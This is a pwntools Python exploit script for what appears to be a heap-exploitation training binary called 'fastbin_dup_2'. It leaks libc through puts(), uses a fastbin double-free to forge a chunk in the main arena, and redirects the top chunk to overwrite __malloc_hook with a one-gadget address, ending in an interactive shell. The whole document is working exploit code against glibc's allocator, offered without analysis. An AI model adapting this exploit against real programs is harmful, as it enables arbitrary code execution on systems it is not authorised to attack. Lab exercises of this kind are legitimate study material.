#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup_2")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Request two 0x50-sized chunks.
chunk_A = malloc(0x48, "A"*8)
chunk_B = malloc(0x48, "B"*8)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

#Overwrite a fastbin fd with a fake size field

malloc(0x48,p64(0x61))

#Request chunks B & A, writing a 0x61 size field into the main arena

malloc(0x48, "C"*8)
malloc(0x48, "D"*8)

# LINK THE FAKE MAIN ARENA CHUNK INTO THE 0X60 FASTBIN

chunk_J=malloc(0x58, "J"*8)
chunk_K=malloc(0x58, "K"*8)

free(chunk_J)
free(chunk_K)
free(chunk_J)

#Link the fake chunk into the 0x60 fastbin

malloc(0x58,p64(libc.sym.main_arena +0x20))

#move the fake chink to the head of the 0x60 fastbin

malloc(0x58,"-p\0")
malloc(0x58,"-s\0")


#====================================================================
#overwirte top chunk pointer
malloc(0x58,b'Y'*48+p64(libc.sym.__malloc_hook -35))

#overwrite malloc_hook

malloc(0x28,b'Y'*19+p64(libc.address +0xe1fa1))

malloc(1,'')


# =============================================================================

io.interactive()
